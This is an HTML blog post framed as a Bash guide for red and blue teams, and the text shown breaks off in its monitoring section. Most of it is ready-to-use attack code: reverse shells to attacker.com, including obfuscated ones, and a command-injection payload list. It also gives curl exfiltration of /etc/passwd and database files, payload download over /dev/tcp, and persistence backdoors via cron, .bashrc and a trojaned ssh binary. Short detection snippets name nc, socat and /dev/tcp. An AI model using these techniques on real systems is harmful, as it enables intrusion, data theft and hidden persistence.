@@ -1,0 +1,505 @@
+<!doctype html><html lang=en><head><title>Bash: The Swiss Army Knife for Security Professionals :: Gareth's Engineering Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='Bash is on every Unix-like system you&rsquo;ll touch. No installation required. No suspicious binaries to explain. Just a shell that&rsquo;s already there, waiting to be used.
+For security operators - red team, blue team, doesn&rsquo;t matter - this makes Bash incredibly valuable. You can do reconnaissance, establish persistence, monitor systems, or respond to incidents without touching disk or installing tools. Living off the land, as they say.
+"The best tools are the ones already on the target. Bash is always there. No explanations needed when someone spots it running." This is a practical guide to using Bash for security operations. Not theory. Not vendor pitches. Techniques that work when you&rsquo;re on a system and need to get things done.
+'><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://gazsecops.github.io/posts/bash-security-operators-guide/><link rel=stylesheet href=https://gazsecops.github.io/css/extended.min.c658c723e006469d82f697e19c5338967fad12c57650bdd915bacf9cfbe2cc38.css><link rel=stylesheet href=https://gazsecops.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://gazsecops.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://gazsecops.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://gazsecops.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://gazsecops.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://gazsecops.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://gazsecops.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://gazsecops.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://gazsecops.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://gazsecops.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://gazsecops.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://gazsecops.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://gazsecops.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel="shortcut icon" href=https://gazsecops.github.io/favicon.png><link rel=apple-touch-icon href=https://gazsecops.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Bash: The Swiss Army Knife for Security Professionals"><meta property="og:description" content='Bash is on every Unix-like system you&rsquo;ll touch. No installation required. No suspicious binaries to explain. Just a shell that&rsquo;s already there, waiting to be used.
+For security operators - red team, blue team, doesn&rsquo;t matter - this makes Bash incredibly valuable. You can do reconnaissance, establish persistence, monitor systems, or respond to incidents without touching disk or installing tools. Living off the land, as they say.
+"The best tools are the ones already on the target. Bash is always there. No explanations needed when someone spots it running." This is a practical guide to using Bash for security operations. Not theory. Not vendor pitches. Techniques that work when you&rsquo;re on a system and need to get things done.
+'><meta property="og:url" content="https://gazsecops.github.io/posts/bash-security-operators-guide/"><meta property="og:site_name" content="Gareth's Engineering Blog"><meta property="og:image" content="https://gazsecops.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2024-12-03 10:00:00 +0000 UTC"></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>gareth@blog:~$</div></a></div><div class=header__search><input type=text id=header-search placeholder="Quick search..." style="padding:5px 10px;background:#222;color:#eee;border:1px solid #444;border-radius:3px;font-size:14px;width:200px"></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/topics/>Topics</a></li><li><a href=/posts/>All</a></li><li><a href=/series/>Series</a></li><li><a href=/tags/>Tags</a></li><li><a href=/archive/>Archive</a></li><li><a href=/search/>Search</a></li><li><a href=/about/>About</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/topics/>Topics</a></li><li><a href=/posts/>All</a></li><li><a href=/series/>Series</a></li><li><a href=/tags/>Tags</a></li><li><a href=/archive/>Archive</a></li><li><a href=/search/>Search</a></li><li><a href=/about/>About</a></li></ul></nav></header><script>(function(){const e=document.getElementById("header-search");if(!e)return;e.addEventListener("keydown",function(e){if(e.key==="Enter"){const e=this.value.trim();e&&(window.location.href="/search?q="+encodeURIComponent(e))}}),document.addEventListener("keydown",function(t){t.key==="/"&&!["INPUT","TEXTAREA"].includes(t.target.tagName)&&(t.preventDefault(),e.focus()),t.key==="Escape"&&t.target===e&&e.blur()})})()</script><style>.header__inner{display:flex;align-items:center;gap:20px}.header__search{flex:none}#header-search::placeholder{color:#666;font-style:italic}#header-search:focus{outline:none;border-color:#888}@media(max-width:684px){.header__search{display:none}}</style><div class=content><article class=post><h1 class=post-title><a href=https://gazsecops.github.io/posts/bash-security-operators-guide/>Bash: The Swiss Army Knife for Security Professionals</a></h1><div class=post-meta><time class=post-date>2024-12-03</time><span class=post-author>Gareth</span><span class=post-reading-time>16 min read (3346 words)</span></div><span class=post-tags>#<a href=https://gazsecops.github.io/tags/bash/>bash</a>&nbsp;
+#<a href=https://gazsecops.github.io/tags/security/>security</a>&nbsp;
+#<a href=https://gazsecops.github.io/tags/red-team/>red-team</a>&nbsp;
+#<a href=https://gazsecops.github.io/tags/blue-team/>blue-team</a>&nbsp;
+#<a href=https://gazsecops.github.io/tags/linux/>linux</a>&nbsp;
+#<a href=https://gazsecops.github.io/tags/operations/>operations</a>&nbsp;</span><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><a href=#why-bash-for-security-work>Why Bash for Security Work</a></li><li><a href=#reconnaissance-without-tools>Reconnaissance Without Tools</a><ul><li><a href=#network-discovery>Network Discovery</a></li><li><a href=#service-fingerprinting>Service Fingerprinting</a></li><li><a href=#dns-reconnaissance>DNS Reconnaissance</a></li></ul></li><li><a href=#exploitation-primitives>Exploitation Primitives</a><ul><li><a href=#reverse-shells>Reverse Shells</a></li><li><a href=#command-injection-testing>Command Injection Testing</a></li><li><a href=#file-transfer-without-tools>File Transfer Without Tools</a></li></ul></li><li><a href=#persistence-techniques>Persistence Techniques</a><ul><li><a href=#cron-jobs>Cron Jobs</a></li><li><a href=#shell-profile-modifications>Shell Profile Modifications</a></li><li><a href=#ssh-authorized-keys>SSH Authorized Keys</a></li><li><a href=#binary-replacement>Binary Replacement</a></li></ul></li><li><a href=#defensive-monitoring>Defensive Monitoring</a><ul><li><a href=#failed-login-detection>Failed Login Detection</a></li><li><a href=#new-suid-binary-detection>New SUID Binary Detection</a></li><li><a href=#process-monitoring>Process Monitoring</a></li><li><a href=#file-integrity-monitoring>File Integrity Monitoring</a></li></ul></li><li><a href=#incident-response>Incident Response</a><ul><li><a href=#system-snapshot>System Snapshot</a></li><li><a href=#live-memory-dump>Live Memory Dump</a></li><li><a href=#log-analysis>Log Analysis</a></li></ul></li><li><a href=#covert-channels>Covert Channels</a><ul><li><a href=#dns-exfiltration>DNS Exfiltration</a></li><li><a href=#icmp-tunneling>ICMP Tunneling</a></li><li><a href=#http-steganography>HTTP Steganography</a></li></ul></li><li><a href=#memory-only-execution>Memory-Only Execution</a></li><li><a href=#anti-forensics>Anti-Forensics</a><ul><li><a href=#clear-tracks>Clear Tracks</a></li><li><a href=#timestamp-manipulation>Timestamp Manipulation</a></li><li><a href=#process-hiding>Process Hiding</a></li></ul></li><li><a href=#evasion-techniques>Evasion Techniques</a><ul><li><a href=#string-obfuscation>String Obfuscation</a></li><li><a href=#encoding-techniques>Encoding Techniques</a></li></ul></li><li><a href=#practical-security-scripts>Practical Security Scripts</a><ul><li><a href=#privilege-escalation-check>Privilege Escalation Check</a></li><li><a href=#port-knock-client>Port Knock Client</a></li><li><a href=#data-exfiltration-wrapper>Data Exfiltration Wrapper</a></li></ul></li><li><a href=#defensive-best-practices>Defensive Best Practices</a><ul><li><a href=#input-validation>Input Validation</a></li><li><a href=#secure-path>Secure PATH</a></li><li><a href=#secure-temporary-files>Secure Temporary Files</a></li></ul></li><li><a href=#detection-techniques>Detection Techniques</a><ul><li><a href=#spotting-bash-abuse>Spotting Bash Abuse</a></li><li><a href=#audit-logging>Audit Logging</a></li></ul></li><li><a href=#real-world-scenarios>Real-World Scenarios</a><ul><li><a href=#scenario-locked-out-need-access>Scenario: Locked Out, Need Access</a></li><li><a href=#scenario-incident-response-need-quick-triage>Scenario: Incident Response, Need Quick Triage</a></li><li><a href=#scenario-need-to-bypass-detection>Scenario: Need to Bypass Detection</a></li></ul></li><li><a href=#limitations-and-risks>Limitations and Risks</a></li><li><a href=#ethical-and-legal-considerations>Ethical and Legal Considerations</a></li><li><a href=#tooling-recommendations>Tooling Recommendations</a></li><li><a href=#summary>Summary</a></li></ul></nav></div><div class=post-content><div><p>Bash is on every Unix-like system you&rsquo;ll touch. No installation required. No suspicious binaries to explain. Just a shell that&rsquo;s already there, waiting to be used.</p><p>For security operators - red team, blue team, doesn&rsquo;t matter - this makes Bash incredibly valuable. You can do reconnaissance, establish persistence, monitor systems, or respond to incidents without touching disk or installing tools. Living off the land, as they say.</p><aside class=pullquote>"The best tools are the ones already on the target. Bash is always there. No explanations needed when someone spots it running."</aside><p>This is a practical guide to using Bash for security operations. Not theory. Not vendor pitches. Techniques that work when you&rsquo;re on a system and need to get things done.</p><h2 id=why-bash-for-security-work>Why Bash for Security Work<a href=#why-bash-for-security-work class=hanchor arialabel=Anchor>#</a></h2><p><strong>It&rsquo;s already there.</strong> Every Linux box. Most Unix systems. macOS. Even Windows has WSL now. You don&rsquo;t install Bash. It&rsquo;s just there.</p><p><strong>No forensic footprint (if you&rsquo;re careful).</strong> Execute from memory. Use <code>/dev/shm</code>. Process substitution. Nothing touches disk. Nothing for forensics to find.</p><p><strong>Full system access.</strong> File system, network, processes, kernel interfaces. If the system can do it, Bash can access it.</p><p><strong>Scripting power.</strong> Not just a command interpreter. Full programming language. Variables, functions, loops, conditionals, arrays. Everything you need.</p><p><strong>Pipeline magic.</strong> Chain commands. Stream processing. Data transformation without intermediate files. Process output in real time.</p><p>The downside? It&rsquo;s also verbose. Error-prone if you&rsquo;re not careful. Not as fast as compiled tools. But when you need to work with what&rsquo;s already on the system, Bash is hard to beat.</p><h2 id=reconnaissance-without-tools>Reconnaissance Without Tools<a href=#reconnaissance-without-tools class=hanchor arialabel=Anchor>#</a></h2><h3 id=network-discovery>Network Discovery<a href=#network-discovery class=hanchor arialabel=Anchor>#</a></h3><p>No nmap? No problem.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Ping sweep - find live hosts</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i in <span style=color:#f92672>{</span>1..254<span style=color:#f92672>}</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ping -c <span style=color:#ae81ff>1</span> -W <span style=color:#ae81ff>1</span> 192.168.1.$i | grep <span style=color:#e6db74>&#34;bytes from&#34;</span> &amp;<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span> | cut -d<span style=color:#e6db74>&#39; &#39;</span> -f4 | tr -d <span style=color:#e6db74>&#39;:&#39;</span>
+</span></span></code></pre></div><p>The parentheses run each ping in a subshell. Backgrounded. All 254 pings happen simultaneously. Takes about a second instead of 254 seconds.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Port scan using /dev/tcp</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> port in <span style=color:#f92672>{</span>1..1024<span style=color:#f92672>}</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    timeout <span style=color:#ae81ff>1</span> bash -c <span style=color:#e6db74>&#34;echo &gt;/dev/tcp/192.168.1.10/</span>$port<span style=color:#e6db74>&#34;</span> 2&gt;/dev/null <span style=color:#f92672>&amp;&amp;</span> 
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Port </span>$port<span style=color:#e6db74> open&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p><code>/dev/tcp</code> is a Bash pseudo-device. Not a real file. Bash intercepts it and opens a TCP connection. Works for scanning. Works for reverse shells. Very useful.</p><h3 id=service-fingerprinting>Service Fingerprinting<a href=#service-fingerprinting class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Banner grabbing</span>
+</span></span><span style=display:flex><span>exec 3&lt;&gt;/dev/tcp/192.168.1.10/22
+</span></span><span style=display:flex><span>cat &lt;&amp;<span style=color:#ae81ff>3</span> &amp;
+</span></span><span style=display:flex><span>sleep <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>kill %1
+</span></span><span style=display:flex><span>exec 3&gt;&amp;-
+</span></span></code></pre></div><p>Opens a connection. Reads whatever the service sends. Most services announce themselves. SSH sends version. HTTP sends Server header. FTP sends banner.</p><h3 id=dns-reconnaissance>DNS Reconnaissance<a href=#dns-reconnaissance class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Subdomain enumeration</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> sub in www mail ftp admin api dev staging; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    host $sub.example.com 2&gt;/dev/null | grep <span style=color:#e6db74>&#34;has address&#34;</span> <span style=color:#f92672>&amp;&amp;</span> 
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Found: </span>$sub<span style=color:#e6db74>.example.com&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Reverse DNS lookup range</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i in <span style=color:#f92672>{</span>1..254<span style=color:#f92672>}</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    host 192.168.1.$i 2&gt;/dev/null | grep <span style=color:#e6db74>&#34;domain name pointer&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>No dig, no nslookup, no specialized tools. Just <code>host</code> which is on every system.</p><h2 id=exploitation-primitives>Exploitation Primitives<a href=#exploitation-primitives class=hanchor arialabel=Anchor>#</a></h2><h3 id=reverse-shells>Reverse Shells<a href=#reverse-shells class=hanchor arialabel=Anchor>#</a></h3><p>The classic:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;<span style=color:#ae81ff>1</span>
+</span></span></code></pre></div><p>How it works:</p><ul><li><code>bash -i</code>: Interactive shell</li><li><code>>&</code>: Redirect both stdout and stderr</li><li><code>/dev/tcp/attacker.com/4444</code>: Connect to attacker</li><li><code>0>&amp;1</code>: Redirect stdin to the same place</li></ul><p><strong>Variations:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Using exec (cleaner, replaces current shell)</span>
+</span></span><span style=display:flex><span>exec 5&lt;&gt;/dev/tcp/attacker.com/4444
+</span></span><span style=display:flex><span>cat &lt;&amp;<span style=color:#ae81ff>5</span> | <span style=color:#66d9ef>while</span> read line; <span style=color:#66d9ef>do</span> $line 2&gt;&amp;<span style=color:#ae81ff>5</span> &gt;&amp;5; <span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Using named pipes (more reliable)</span>
+</span></span><span style=display:flex><span>rm /tmp/f; mkfifo /tmp/f
+</span></span><span style=display:flex><span>cat /tmp/f | /bin/bash -i 2&gt;&amp;<span style=color:#ae81ff>1</span> | nc attacker.com <span style=color:#ae81ff>4444</span> &gt;/tmp/f
+</span></span></code></pre></div><p>The named pipe version is more stable. Input goes through the pipe, gets executed, output goes back through netcat.</p><p><strong>Obfuscated for evasion:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Base64 encoded</span>
+</span></span><span style=display:flex><span>echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d | bash
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Variable splitting</span>
+</span></span><span style=display:flex><span>h<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;at&#34;</span>;t<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ta&#34;</span>;c<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ck&#34;</span>;e<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;er.com&#34;</span>;
+</span></span><span style=display:flex><span>bash -i &gt;&amp; /dev/tcp/$t$c$e/4444 0&gt;&amp;<span style=color:#ae81ff>1</span>
+</span></span></code></pre></div><p>Not foolproof. But makes automated detection harder.</p><h3 id=command-injection-testing>Command Injection Testing<a href=#command-injection-testing class=hanchor arialabel=Anchor>#</a></h3><p>When you find a field that might execute commands:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Test payloads</span>
+</span></span><span style=display:flex><span>payloads<span style=color:#f92672>=(</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;; id&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;| id&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;\$(id)&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;\`id\`&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;&amp; id&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;|| id&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> payload in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>payloads[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    curl -s <span style=color:#e6db74>&#34;https://target.com/search?q=test</span><span style=color:#e6db74>${</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> | grep <span style=color:#e6db74>&#34;uid=&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>If you see <code>uid=</code> in the response, you have command injection.</p><h3 id=file-transfer-without-tools>File Transfer Without Tools<a href=#file-transfer-without-tools class=hanchor arialabel=Anchor>#</a></h3><p><strong>Upload:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Exfiltrate via base64</span>
+</span></span><span style=display:flex><span>cat /etc/passwd | base64 | curl -X POST -d @- https://attacker.com/upload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Chunk large files</span>
+</span></span><span style=display:flex><span>split -b 1M sensitive.db chunk_
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> chunk in chunk_*; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    curl -X POST -F <span style=color:#e6db74>&#34;file=@</span>$chunk<span style=color:#e6db74>&#34;</span> https://attacker.com/upload
+</span></span><span style=display:flex><span>    rm $chunk
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p><strong>Download:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Using only Bash</span>
+</span></span><span style=display:flex><span>exec 3&lt;&gt;/dev/tcp/attacker.com/80
+</span></span><span style=display:flex><span>echo -e <span style=color:#e6db74>&#34;GET /payload.sh HTTP/1.1\r\nHost: attacker.com\r\n\r\n&#34;</span> &gt;&amp;<span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>sed <span style=color:#e6db74>&#39;1,/^$/d&#39;</span> &lt;&amp;<span style=color:#ae81ff>3</span> &gt; payload.sh
+</span></span><span style=display:flex><span>exec 3&gt;&amp;-
+</span></span><span style=display:flex><span>chmod +x payload.sh
+</span></span></code></pre></div><p>Opens TCP connection. Sends HTTP GET request. Strips headers. Saves body. No curl. No wget.</p><h2 id=persistence-techniques>Persistence Techniques<a href=#persistence-techniques class=hanchor arialabel=Anchor>#</a></h2><h3 id=cron-jobs>Cron Jobs<a href=#cron-jobs class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Add backdoor to user&#39;s crontab</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>crontab -l 2&gt;/dev/null; echo <span style=color:#e6db74>&#34;*/5 * * * * bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1&#39;&#34;</span><span style=color:#f92672>)</span> | crontab -
+</span></span></code></pre></div><p>Runs every 5 minutes. Establishes reverse shell. If connection drops, cron will retry in 5 minutes.</p><h3 id=shell-profile-modifications>Shell Profile Modifications<a href=#shell-profile-modifications class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Backdoor in bashrc</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1 &amp;&#39;</span> &gt;&gt; ~/.bashrc
+</span></span></code></pre></div><p>Triggers every time user opens a shell. Backgrounded so user doesn&rsquo;t notice delay.</p><h3 id=ssh-authorized-keys>SSH Authorized Keys<a href=#ssh-authorized-keys class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Add your public key</span>
+</span></span><span style=display:flex><span>mkdir -p ~/.ssh
+</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>700</span> ~/.ssh
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;ssh-rsa AAAA...&#34;</span> &gt;&gt; ~/.ssh/authorized_keys
+</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> ~/.ssh/authorized_keys
+</span></span></code></pre></div><p>Persistent SSH access. Survives reboots. Hard to detect unless someone checks authorized_keys.</p><h3 id=binary-replacement>Binary Replacement<a href=#binary-replacement class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Replace legitimate binary with wrapper</span>
+</span></span><span style=display:flex><span>mv /usr/bin/ssh /usr/bin/.ssh.real
+</span></span><span style=display:flex><span>cat &gt; /usr/bin/ssh <span style=color:#e6db74>&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#e6db74># Backdoor triggers, then executes real ssh
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1&#39; &amp;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>exec /usr/bin/.ssh.real &#34;$@&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>EOF</span>
+</span></span><span style=display:flex><span>chmod +x /usr/bin/ssh
+</span></span></code></pre></div><p>User runs ssh. Backdoor triggers. Real ssh executes. User sees normal behavior.</p><h2 id=defensive-monitoring>Defensive Monitoring<a href=#defensive-monitoring class=hanchor arialabel=Anchor>#</a></h2><h3 id=failed-login-detection>Failed Login Detection<a href=#failed-login-detection class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Watch for brute force attempts</span>
+</span></span><span style=display:flex><span>grep <span style=color:#e6db74>&#34;Failed password&#34;</span> /var/log/auth.log | 
+</span></span><span style=display:flex><span>    awk <span style=color:#e6db74>&#39;{print $11}&#39;</span> | 
+</span></span><span style=display:flex><span>    sort | 
+</span></span><span style=display:flex><span>    uniq -c | 
+</span></span><span style=display:flex><span>    sort -nr | 
+</span></span><span style=display:flex><span>    awk <span style=color:#e6db74>&#39;$1 &gt; 5 {print &#34;Brute force from &#34; $2 &#34;: &#34; $1 &#34; attempts&#34;}&#39;</span>
+</span></span></code></pre></div><p>Finds IPs with more than 5 failed logins. Simple brute force detection.</p><h3 id=new-suid-binary-detection>New SUID Binary Detection<a href=#new-suid-binary-detection class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Create baseline</span>
+</span></span><span style=display:flex><span>find / -perm -4000 -type f 2&gt;/dev/null &gt; /tmp/suid_baseline
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check for changes</span>
+</span></span><span style=display:flex><span>find / -perm -4000 -type f 2&gt;/dev/null &gt; /tmp/suid_current
+</span></span><span style=display:flex><span>diff /tmp/suid_baseline /tmp/suid_current
+</span></span></code></pre></div><p>SUID binaries run with owner&rsquo;s privileges. Attackers create SUID shells for privilege escalation. Monitor for new ones.</p><h3 id=process-monitoring>Process Monitoring<a href=#process-monitoring class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Watch for suspicious processes</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> true; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    ps aux | grep -v <span style=color:#e6db74>&#34;^root&#34;</span> | grep -E <span style=color:#e6db74>&#34;nc|ncat|socat|/dev/tcp&#34;</span> | 
+</span></span><span style=display:flex><span>        grep -v grep <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;Suspicious process detected!&#34;</span>
+</span></span><span style=display:flex><span>    sleep <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
